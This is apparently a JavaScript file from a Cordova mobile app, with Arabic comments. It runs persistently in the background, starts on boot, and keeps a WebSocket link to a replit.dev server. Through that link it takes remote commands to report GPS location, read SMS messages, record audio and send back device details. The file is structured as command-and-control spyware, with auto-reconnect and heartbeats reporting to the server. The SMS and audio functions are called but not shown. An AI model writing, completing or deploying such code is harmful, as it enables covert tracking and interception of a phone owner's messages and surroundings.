document.addEventListener('deviceready', onDeviceReady, false);

const receivedRequests = [];
let wsConnection = null;
let heartbeatInterval = null;

function onDeviceReady() {
    console.log('Device is ready');

    // تفعيل العمل في الخلفية
    if (cordova.plugins.backgroundMode) {
        cordova.plugins.backgroundMode.enable();
        cordova.plugins.backgroundMode.setDefaults({
            title: 'التطبيق يعمل في الخلفية',
            text: 'جارٍ مراقبة الأوامر الواردة'
        });
    }

    // تشغيل الخدمة الدائمة Foreground Service
    if (cordova.plugins.foregroundService) {
        cordova.plugins.foregroundService.start(
            'التطبيق يعمل',
            'جارٍ مراقبة الأوامر في الخلفية',
            'ic_stat_icon'
        );
    }

    // تفعيل التشغيل التلقائي عند إعادة تشغيل الجهاز
    if (cordova.plugins.autoStart) {
        cordova.plugins.autoStart.enable();
        cordova.plugins.autoStart.enableBootStart();
    }

    // جمع بيانات الجهاز
    const deviceInfo = {
        uuid: device.uuid || generateUUID(),
        model: device.model || 'Unknown',
        platform: device.platform || 'Unknown',
        version: device.version || 'Unknown',
        manufacturer: device.manufacturer || 'Unknown',
        battery: null,
        timestamp: new Date().toISOString()
    };

    // الحصول على حالة البطارية
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            deviceInfo.battery = {
                level: Math.round(battery.level * 100),
                charging: battery.charging
            };
            connectToServer(deviceInfo);
        });
    } else {
        connectToServer(deviceInfo);
    }

    // التحقق عند استئناف التطبيق
    document.addEventListener('resume', () => {
        if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
            console.log('App resumed, reconnecting...');
            connectToServer(deviceInfo);
        }
    }, false);
}

function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        const r = Math.random() * 16 | 0;
        const v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

function connectToServer(deviceInfo) {
    const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';

    wsConnection = new WebSocket(wsUrl);

    wsConnection.onopen = () => {
        console.log('Connected to server');
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        heartbeatInterval = setInterval(() => {
            if (wsConnection.readyState === WebSocket.OPEN) {
                wsConnection.send(JSON.stringify({
                    type: 'heartbeat',
                    timestamp: new Date().toISOString(),
                    battery: deviceInfo.battery,
                    receivedRequests
                }));
            }
        }, 30000);
    };

    wsConnection.onmessage = (event) => {
        try {
            const command = JSON.parse(event.data);
            executeCommand(command, (response) => {
                if (wsConnection.readyState === WebSocket.OPEN) {
                    wsConnection.send(JSON.stringify(response));
                }
            });
        } catch (error) {
            console.error('Invalid command received:', error);
        }
    };

    wsConnection.onerror = (error) => {
        console.error('WebSocket error:', error);
    };

    wsConnection.onclose = () => {
        console.log('Disconnected from server, retrying in 10s...');
        setTimeout(() => connectToServer(deviceInfo), 10000);
    };
}

function executeCommand(command, callback) {
    console.log('Executing command:', command);
    const commandId = Date.now();
    switch (command.type) {
        case 'get_location':
            getLocation(commandId, callback);
            break;
        case 'get_sms':
            getSMS(commandId, callback);
            break;
        case 'record_audio':
            recordAudio(commandId, command.duration, callback);
            break;
        case 'get_device_info':
            getDeviceInfo(commandId, callback);
            break;
        default:
            callback({
                commandId,
                status: 'error',
                error: 'Unknown command',
                receivedCommand: command
            });
    }
}

function getLocation(commandId, callback) {
    const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
    navigator.geolocation.getCurrentPosition(
        (position) => {
            callback({
                commandId,
                status: 'success',
                location: {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                }
            });
        },
        (error) => {
            callback({
                commandId,
                status: 'error',
                error: error.message
            });
        },
        options
    );
}

function getDeviceInfo(commandId, callback) {
    const info = {
        cordova: device.cordova,
        model: device.model,
        platform: device.platform,
        uuid: device.uuid,
        version: device.version,
        manufacturer: device.manufacturer,
        isVirtual: device.isVirtual
    };
    callback({ commandId, status: 'success', deviceInfo: info });
}
